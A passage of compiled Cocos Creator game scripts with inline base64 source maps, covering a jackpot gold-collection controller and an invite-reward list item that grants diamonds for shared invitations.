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LGFBQUssQ0FBQyxFQUFFLENBQUMsVUFBVSxHQUFHLEVBQUUsR0FBQyxFQUFFLEdBQUMsRUFBRSxHQUFDLElBQUksQ0FBQztRQUN0RSxJQUFJLENBQUMsZUFBZSxFQUFFLENBQUM7UUFDdkIsSUFBSSw2QkFBYSxDQUFDLGFBQWEsRUFBQztZQUM1QixpQkFBTyxDQUFDLFdBQVcsRUFBRSxDQUFDO1NBQ3pCO0lBQ0wsQ0FBQztJQTNHRDtRQURDLFFBQVEsQ0FBQyxFQUFFLENBQUMsV0FBVyxDQUFDOzBEQUNVO0lBR25DO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxLQUFLLENBQUM7d0RBQ1E7SUFHM0I7UUFEQyxRQUFRLENBQUMsRUFBRSxDQUFDLEtBQUssQ0FBQzt3REFDTztJQUcxQjtRQURDLFFBQVEsQ0FBQyxFQUFFLENBQUMsTUFBTSxDQUFDO3FEQUNJO0lBWlAsaUJBQWlCO1FBRHJDLE9BQU87T0FDYSxpQkFBaUIsQ0ErR3JDO0lBQUQsd0JBQUM7Q0EvR0QsQUErR0MsQ0EvRzhDLEVBQUUsQ0FBQyxTQUFTLEdBK0cxRDtrQkEvR29CLGlCQUFpQiIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIlxyXG5pbXBvcnQge1dvcmxkfSBmcm9tIFwiLi4vaW5mby9Xb3JsZFwiO1xyXG5pbXBvcnQge0V4Y2VsQ29uZmlnfSBmcm9tIFwiLi4vLi4vLi4vZnJhbWV3b3JrL2NvbmZpZy9FeGNlbENvbmZpZ1wiO1xyXG5pbXBvcnQge0V4Y2VsVGFibGVOYW1lc30gZnJvbSBcIi4uL2NvbmZpZy9FeGNlbFRhYmxlTmFtZXNcIjtcclxuaW1wb3J0IHtleHR9IGZyb20gXCIuLi8uLi8uLi9mcmFtZXdvcmsvZXh0ZW5kL0V4dGVuZFwiO1xyXG5pbXBvcnQge05ldHdvcmtDb25maWd9IGZyb20gXCIuLi9jb25maWcvTmV0d29ya0NvbmZpZ1wiO1xyXG5pbXBvcnQgTmV0d29yayBmcm9tIFwiLi4vbmV0d29yay9OZXR3b3JrXCI7XHJcbmltcG9ydCBGYWNhZGUgZnJvbSBcIi4uLy4uLy4uL2ZyYW1ld29yay9mYWNhZGUvRmFjYWRlXCI7XHJcblxyXG5jb25zdCB7Y2NjbGFzcywgcHJvcGVydHl9ID0gY2MuX2RlY29yYXRvcjtcclxuXHJcbkBjY2NsYXNzXHJcbmV4cG9ydCBkZWZhdWx0IGNsYXNzIEphY2twb3RDb250cm9sbGVyIGV4dGVuZHMgY2MuQ29tcG9uZW50IHtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuUHJvZ3Jlc3NCYXIpXHJcbiAgICBwcm9ncmVzc0JhcjogY2MuUHJvZ3Jlc3NCYXIgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5MYWJlbClcclxuICAgIGdvbGRMYWJlbDogY2MuTGFiZWwgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5MYWJlbClcclxuICAgIHRha2VMYWJlbDpjYy5MYWJlbCA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLkJ1dHRvbilcclxuICAgIGJ1dHRvbjpjYy5CdXR0b24gPSBudWxsO1xyXG5cclxuICAgIC8vIExJRkUtQ1lDTEUgQ0FMTEJBQ0tTOlxyXG5cclxuICAgIG9uTG9hZCgpe1xyXG4gICAgICAgIHRoaXMucHJvZ3Jlc3NCYXIubm9kZS5hY3RpdmUgPSBmYWxzZTtcclxuICAgICAgICB0aGlzLmdvbGRMYWJlbC5ub2RlLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgIHRoaXMudGFrZUxhYmVsLm5vZGUuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgRmFjYWRlLmNhbnZhc05vZGUub24oJ1Rha2VKYWNrcG90JywgdGhpcy5fdGFrZUl0LCB0aGlzKTtcclxuICAgICAgICB0aGlzLmluaXQoKTtcclxuXHJcbiAgICAgICAgY2MuZ2FtZS5vbihcInZpZGVvXzZcIiwoKT0+e1xyXG4gICAgICAgICAgICB0aGlzLnRha2VJdDNEbygpXHJcbiAgICAgICAgfSx0aGlzKTtcclxuICAgIH1cclxuXHJcbiAgICBvbkRlc3Ryb3koKXtcclxuICAgICAgICBGYWNhZGUuY2FudmFzTm9kZS5vZmYoJ1Rha2VKYWNrcG90JywgdGhpcy5fdGFrZUl0LCB0aGlzKTtcclxuICAgIH1cclxuXHJcblxyXG4gICAgaW5pdCgpe1xyXG4gICAgICAgIHRoaXMuc2NoZWR1bGVPbmNlKCgpPT57XHJcbiAgICAgICAgICAgIHRoaXMuZ29sZExhYmVsLm5vZGUuYWN0aXZlID0gdHJ1ZTtcclxuICAgICAgICAgICAgaWYgKFdvcmxkLlN0b3JhZ2UuZGF5RWFyblRvdGFsTW9kaWZ5VGltZSA9PSAwKXtcclxuICAgICAgICAgICAgICAgIFdvcmxkLlN0b3JhZ2UuZGF5RWFyblRvdGFsTW9kaWZ5VGltZSA9IFdvcmxkLk15LnNlcnZlclRpbWU7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgaWYgKFdvcmxkLlN0b3JhZ2UuZGF5RWFybkV4cGlyZVRpbWUgID09IDApe1xyXG4gICAgICAgICAgICAgICAgV29ybGQuU3RvcmFnZS5kYXlFYXJuRXhwaXJlVGltZSA9IFdvcmxkLk15LnNlcnZlclRpbWUgKyAyNCo2MCo2MCoxMDAwO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIHRoaXMuc2NoZWR1bGUoKCkgPT4ge1xyXG4gICAgICAgICAgICAgICAgdGhpcy51cGRhdGVEYXlFYXJuQ0QoKTtcclxuICAgICAgICAgICAgfSwgMCk7XHJcbiAgICAgICAgICAgIHRoaXMudXBkYXRlRGF5RWFybkNEKCk7XHJcbiAgICAgICAgfSwgMC4xKTtcclxuICAgIH1cclxuXHJcbiAgICB1cGRhdGVEYXlFYXJuQ0QoKXtcclxuICAgICAgICBsZXQgY3VycmVudFRpbWUgPSBXb3JsZC5NeS5zZXJ2ZXJUaW1lO1xyXG4gICAgICAgIGxldCBjZFRpbWUgPSAoV29ybGQuU3RvcmFnZS5kYXlFYXJuRXhwaXJlVGltZSAtIGN1cnJlbnRUaW1lKS8xMDAwO1xyXG4gICAgICAgIGxldCBwcm9ncmVzcyA9IDA7XHJcbiAgICAgICAgaWYgKGNkVGltZSA+IDApe1xyXG4gICAgICAgICAgICBwcm9ncmVzcyA9ICgyNCo2MCo2MCoxMDAwIC0gY2RUaW1lKjEwMDApLygyNCo2MCo2MCoxMDAwKTtcclxuICAgICAgICAgICAgaWYgKHByb2dyZXNzID4gMSl7XHJcbiAgICAgICAgICAgICAgICBwcm9ncmVzcyA9IDE7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9ZWxzZSB7XHJcbiAgICAgICAgICAgIHByb2dyZXNzID0gMTtcclxuICAgICAgICB9XHJcbiAgICAgICAgdGhpcy5wcm9ncmVzc0Jhci5ub2RlLmFjdGl2ZSA9IHByb2dyZXNzIDwgMTtcclxuICAgICAgICBsZXQgY2ZnID0gRXhjZWxDb25maWcuZ2V0RXhjZWxUYWJsZShFeGNlbFRhYmxlTmFtZXMuR29sZFVwKTtcclxuICAgICAgICBsZXQgZGF5R2V0ID0gY2ZnW1dvcmxkLlN0b3JhZ2UuZGF5RWFybkx2LTFdWydvbl9ob29rJ107XHJcbiAgICAgICAgbGV0IGRpZmZUaW1lID0gKFdvcmxkLk15LnNlcnZlclRpbWUgLSBXb3JsZC5TdG9yYWdlLmRheUVhcm5Ub3RhbE1vZGlmeVRpbWUpLzEwMDA7XHJcbiAgICAgICAgbGV0IGFkZFRvdGFsID0gTWF0aC5mbG9vcihkaWZmVGltZS8zKSAqIGRheUdldDtcclxuICAgICAgICBpZiAoYWRkVG90YWwgPiAwKXtcclxuICAgICAgICAgICAgV29ybGQuU3RvcmFnZS5kYXlFYXJuVG90YWwgKz0gYWRkVG90YWw7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIHRoaXMuZ29sZExhYmVsLnN0cmluZyA9IGV4dC5zaG9ydEZvcm1hdChXb3JsZC5TdG9yYWdlLmRheUVhcm5Ub3RhbCk7XHJcbiAgICAgICAgdGhpcy5idXR0b24uaW50ZXJhY3RhYmxlID0gV29ybGQuU3RvcmFnZS5kYXlFYXJuVG90YWwgPiAwO1xyXG4gICAgICAgIHRoaXMudGFrZUxhYmVsLm5vZGUuYWN0aXZlID0gV29ybGQuU3RvcmFnZS5kYXlFYXJuVG90YWwgPiAwO1xyXG4gICAgICAgIHRoaXMucHJvZ3Jlc3NCYXIucHJvZ3Jlc3MgPSAoZGlmZlRpbWUlMykgLyAzO1xyXG4gICAgfVxyXG5cclxuICAgIF90YWtlSXQobnVtOm51bWJlcil7XHJcbiAgICAgICAgY29uc29sZS5sb2coXCLjgJB2aWRlb+OAkTYg5aSa5YCN6YeR5biB44CQY2xpY2vjgJFKYWNrcG90Q29udHJvbGxlciBfdGFrZUl0XCIsIG51bSlcclxuXHJcbiAgICAgICAgaWYgKG51bT09MSl7XHJcbiAgICAgICAgICAgIHRoaXMudGFrZUlkMSgpXHJcbiAgICAgICAgfWVsc2V7XHJcbiAgICAgICAgICAgIHRoaXMudGFrZUl0MygpXHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG5cclxuICAgIHRha2VJZDEoKSB7XHJcbiAgICAgICAgV29ybGQuU3RvcmFnZS5nb2xkQ291bnQgKz0gV29ybGQuU3RvcmFnZS5kYXlFYXJuVG90YWwqMTtcclxuICAgICAgICBGYWNhZGUuZXhlY3V0ZUNvbW1hbmQoJ1Nob3dUaXBzQ29tbWFuZCcsIGDph5HluIEgKyR7ZXh0LnNob3J0Rm9ybWF0KFdvcmxkLlN0b3JhZ2UuZGF5RWFyblRvdGFsKjEpfWApO1xyXG4gICAgICAgIFdvcmxkLlN0b3JhZ2UuZGF5RWFyblRvdGFsID0gMDtcclxuICAgICAgICBXb3JsZC5TdG9yYWdlLmRheUVhcm5FeHBpcmVUaW1lID0gV29ybGQuTXkuc2VydmVyVGltZSArIDI0KjYwKjYwKjEwMDA7XHJcbiAgICAgICAgdGhpcy51cGRhdGVEYXlFYXJuQ0QoKTtcclxuICAgICAgICBpZiAoTmV0d29ya0NvbmZpZy5jb25uZWN0U2VydmVyKXtcclxuICAgICAgICAgICAgTmV0d29yay5wdXNoU3RvcmFnZSgpO1xyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcbiAgICB0YWtlSXQzKCkge1xyXG4gICAgICAgIFdvcmxkLlN0b3JhZ2UuX3ZpZGVvU2lnbj02XHJcbiAgICAgICAgV29ybGQuU3RvcmFnZS52aWRlb0FkX3Nob3coKSBcclxuICAgIH1cclxuXHJcbiAgICB0YWtlSXQzRG8oKXtcclxuICAgICAgICBXb3JsZC5TdG9yYWdlLmdvbGRDb3VudCArPSBXb3JsZC5TdG9yYWdlLmRheUVhcm5Ub3RhbCozO1xyXG4gICAgICAgIEZhY2FkZS5leGVjdXRlQ29tbWFuZCgnU2hvd1RpcHNDb21tYW5kJywgYOmHkeW4gSArJHtleHQuc2hvcnRGb3JtYXQoV29ybGQuU3RvcmFnZS5kYXlFYXJuVG90YWwqMyl9YCk7XHJcbiAgICAgICAgV29ybGQuU3RvcmFnZS5kYXlFYXJuVG90YWwgPSAwO1xyXG4gICAgICAgIFdvcmxkLlN0b3JhZ2UuZGF5RWFybkV4cGlyZVRpbWUgPSBXb3JsZC5NeS5zZXJ2ZXJUaW1lICsgMjQqNjAqNjAqMTAwMDtcclxuICAgICAgICB0aGlzLnVwZGF0ZURheUVhcm5DRCgpO1xyXG4gICAgICAgIGlmIChOZXR3b3JrQ29uZmlnLmNvbm5lY3RTZXJ2ZXIpe1xyXG4gICAgICAgICAgICBOZXR3b3JrLnB1c2hTdG9yYWdlKCk7XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG59XHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/home/InviteItem.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '618ecW0IVZD/IS6hmiplscv', 'InviteItem');
// script/app/home/InviteItem.ts

Object.defineProperty(exports, "__esModule", { value: true });
var AbstractTableItem_1 = require("../../../framework/tableview/AbstractTableItem");
var Extend_1 = require("../../../framework/extend/Extend");
var Network_1 = require("../network/Network");
var World_1 = require("../info/World");
var Facade_1 = require("../../../framework/facade/Facade");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var rewardNum = 30;
var InviteItem = /** @class */ (function (_super) {
    __extends(InviteItem, _super);
    function InviteItem() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.idLabel = null;
        _this.iconSprite = null;
        _this.rewardLabel = null;
        _this.takenNode = null;
        _this.willTakeNode = null;
        _this.data = null;
        return _this;
    }
    InviteItem.prototype.upadteItem = function (data, index) {
        console.log(data, "share1===>upadteItem");
        this.data = data;
        this.idLabel.string = (index + 1).toString();
        this.rewardLabel.string = rewardNum.toString();
        Extend_1.ext.wxCreateImageToSprite(this.iconSprite, data['headUrl']);
        this.takenNode.active = data['receive'];
        this.willTakeNode.active = !this.takenNode.active;
    };
    InviteItem.prototype.onClickTakeReward = function (event, data) {
        var _this = this;
        console.log("【click】InviteItem TakeReward");
        if (this.data) {
            this.willTakeNode.getComponent(cc.Button).interactable = false;
            Network_1.default.takeShareReward("share1", this.data["playerId"]).then(function (res) {
                World_1.World.Storage.diamondCount += rewardNum;
                Facade_1.default.executeCommand('ShowTipsCommand', "\u94BB\u77F3 +" + rewardNum);
                _this.takenNode.active = true;
                _this.willTakeNode.active = !_this.takenNode.active;
            });
        }
    };
    __decorate([
        property(cc.Label)
    ], InviteItem.prototype, "idLabel", void 0);
    __decorate([
        property(cc.Sprite)
    ], InviteItem.prototype, "iconSprite", void 0);
    __decorate([
        property(cc.Label)
    ], InviteItem.prototype, "rewardLabel", void 0);
    __decorate([
        property(cc.Node)
    ], InviteItem.prototype, "takenNode", void 0);
    __decorate([
        property(cc.Node)
    ], InviteItem.prototype, "willTakeNode", void 0);
    InviteItem = __decorate([
        ccclass
    ], InviteItem);
    return InviteItem;
}(AbstractTableItem_1.default));
exports.default = InviteItem;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2hvbWUvSW52aXRlSXRlbS50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7O0FBQ0Esb0ZBQStFO0FBQy9FLDJEQUFxRDtBQUNyRCw4Q0FBeUM7QUFDekMsdUNBQW9DO0FBQ3BDLDJEQUFzRDtBQUVoRCxJQUFBLEtBQXNCLEVBQUUsQ0FBQyxVQUFVLEVBQWxDLE9BQU8sYUFBQSxFQUFFLFFBQVEsY0FBaUIsQ0FBQztBQUUxQyxJQUFNLFNBQVMsR0FBRyxFQUFFLENBQUM7QUFHckI7SUFBd0MsOEJBQWlCO0lBQXpEO1FBQUEscUVBMkNDO1FBeENHLGFBQU8sR0FBWSxJQUFJLENBQUM7UUFHeEIsZ0JBQVUsR0FBYSxJQUFJLENBQUM7UUFHNUIsaUJBQVcsR0FBWSxJQUFJLENBQUM7UUFHNUIsZUFBUyxHQUFXLElBQUksQ0FBQztRQUd6QixrQkFBWSxHQUFXLElBQUksQ0FBQztRQUdwQixVQUFJLEdBQUcsSUFBSSxDQUFDOztJQXlCeEIsQ0FBQztJQXZCRywrQkFBVSxHQUFWLFVBQVcsSUFBUyxFQUFFLEtBQWE7UUFDL0IsT0FBTyxDQUFDLEdBQUcsQ0FBQyxJQUFJLEVBQUUsc0JBQXNCLENBQUMsQ0FBQztRQUMxQyxJQUFJLENBQUMsSUFBSSxHQUFHLElBQUksQ0FBQztRQUNqQixJQUFJLENBQUMsT0FBTyxDQUFDLE1BQU0sR0FBRyxDQUFDLEtBQUssR0FBQyxDQUFDLENBQUMsQ0FBQyxRQUFRLEVBQUUsQ0FBQztRQUMzQyxJQUFJLENBQUMsV0FBVyxDQUFDLE1BQU0sR0FBRyxTQUFTLENBQUMsUUFBUSxFQUFFLENBQUM7UUFDL0MsWUFBRyxDQUFDLHFCQUFxQixDQUFDLElBQUksQ0FBQyxVQUFVLEVBQUUsSUFBSSxDQUFDLFNBQVMsQ0FBQyxDQUFDLENBQUM7UUFDNUQsSUFBSSxDQUFDLFNBQVMsQ0FBQyxNQUFNLEdBQUcsSUFBSSxDQUFDLFNBQVMsQ0FBQyxDQUFDO1FBQ3hDLElBQUksQ0FBQyxZQUFZLENBQUMsTUFBTSxHQUFHLENBQUMsSUFBSSxDQUFDLFNBQVMsQ0FBQyxNQUFNLENBQUM7SUFDdEQsQ0FBQztJQUVELHNDQUFpQixHQUFqQixVQUFrQixLQUFLLEVBQUUsSUFBSTtRQUE3QixpQkFZQztRQVhHLE9BQU8sQ0FBQyxHQUFHLENBQUMsOEJBQThCLENBQUMsQ0FBQTtRQUUzQyxJQUFJLElBQUksQ0FBQyxJQUFJLEVBQUM7WUFDVixJQUFJLENBQUMsWUFBWSxDQUFDLFlBQVksQ0FBQyxFQUFFLENBQUMsTUFBTSxDQUFDLENBQUMsWUFBWSxHQUFHLEtBQUssQ0FBQztZQUMvRCxpQkFBTyxDQUFDLGVBQWUsQ0FBQyxRQUFRLEVBQUUsSUFBSSxDQUFDLElBQUksQ0FBQyxVQUFVLENBQUMsQ0FBQyxDQUFDLElBQUksQ0FBQyxVQUFBLEdBQUc7Z0JBQzdELGFBQUssQ0FBQyxPQUFPLENBQUMsWUFBWSxJQUFJLFNBQVMsQ0FBQztnQkFDeEMsZ0JBQU0sQ0FBQyxjQUFjLENBQUMsaUJBQWlCLEVBQUUsbUJBQU8sU0FBVyxDQUFDLENBQUM7Z0JBQzdELEtBQUksQ0FBQyxTQUFTLENBQUMsTUFBTSxHQUFHLElBQUksQ0FBQztnQkFDN0IsS0FBSSxDQUFDLFlBQVksQ0FBQyxNQUFNLEdBQUcsQ0FBQyxLQUFJLENBQUMsU0FBUyxDQUFDLE1BQU0sQ0FBQztZQUN0RCxDQUFDLENBQUMsQ0FBQztTQUNOO0lBQ0wsQ0FBQztJQXZDRDtRQURDLFFBQVEsQ0FBQyxFQUFFLENBQUMsS0FBSyxDQUFDOytDQUNLO0lBR3hCO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxNQUFNLENBQUM7a0RBQ1E7SUFHNUI7UUFEQyxRQUFRLENBQUMsRUFBRSxDQUFDLEtBQUssQ0FBQzttREFDUztJQUc1QjtRQURDLFFBQVEsQ0FBQyxFQUFFLENBQUMsSUFBSSxDQUFDO2lEQUNPO0lBR3pCO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxJQUFJLENBQUM7b0RBQ1U7SUFmWCxVQUFVO1FBRDlCLE9BQU87T0FDYSxVQUFVLENBMkM5QjtJQUFELGlCQUFDO0NBM0NELEFBMkNDLENBM0N1QywyQkFBaUIsR0EyQ3hEO2tCQTNDb0IsVUFBVSIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIlxyXG5pbXBvcnQgQWJzdHJhY3RUYWJsZUl0ZW0gZnJvbSBcIi4uLy4uLy4uL2ZyYW1ld29yay90YWJsZXZpZXcvQWJzdHJhY3RUYWJsZUl0ZW1cIjtcclxuaW1wb3J0IHtleHR9IGZyb20gXCIuLi8uLi8uLi9mcmFtZXdvcmsvZXh0ZW5kL0V4dGVuZFwiO1xyXG5pbXBvcnQgTmV0d29yayBmcm9tIFwiLi4vbmV0d29yay9OZXR3b3JrXCI7XHJcbmltcG9ydCB7V29ybGR9IGZyb20gXCIuLi9pbmZvL1dvcmxkXCI7XHJcbmltcG9ydCBGYWNhZGUgZnJvbSBcIi4uLy4uLy4uL2ZyYW1ld29yay9mYWNhZGUvRmFjYWRlXCI7XHJcblxyXG5jb25zdCB7Y2NjbGFzcywgcHJvcGVydHl9ID0gY2MuX2RlY29yYXRvcjtcclxuXHJcbmNvbnN0IHJld2FyZE51bSA9IDMwO1xyXG5cclxuQGNjY2xhc3NcclxuZXhwb3J0IGRlZmF1bHQgY2xhc3MgSW52aXRlSXRlbSBleHRlbmRzIEFic3RyYWN0VGFibGVJdGVtIHtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuTGFiZWwpXHJcbiAgICBpZExhYmVsOmNjLkxhYmVsID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuU3ByaXRlKVxyXG4gICAgaWNvblNwcml0ZTpjYy5TcHJpdGUgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5MYWJlbClcclxuICAgIHJld2FyZExhYmVsOmNjLkxhYmVsID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuTm9kZSlcclxuICAgIHRha2VuTm9kZTpjYy5Ob2RlID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuTm9kZSlcclxuICAgIHdpbGxUYWtlTm9kZTpjYy5Ob2RlID0gbnVsbDtcclxuXHJcblxyXG4gICAgcHJpdmF0ZSBkYXRhID0gbnVsbDtcclxuXHJcbiAgICB1cGFkdGVJdGVtKGRhdGE6IGFueSwgaW5kZXg6IG51bWJlcikge1xyXG4gICAgICAgIGNvbnNvbGUubG9nKGRhdGEsIFwic2hhcmUxPT09PnVwYWR0ZUl0ZW1cIik7XHJcbiAgICAgICAgdGhpcy5kYXRhID0gZGF0YTtcclxuICAgICAgICB0aGlzLmlkTGFiZWwuc3RyaW5nID0gKGluZGV4KzEpLnRvU3RyaW5nKCk7XHJcbiAgICAgICAgdGhpcy5yZXdhcmRMYWJlbC5zdHJpbmcgPSByZXdhcmROdW0udG9TdHJpbmcoKTtcclxuICAgICAgI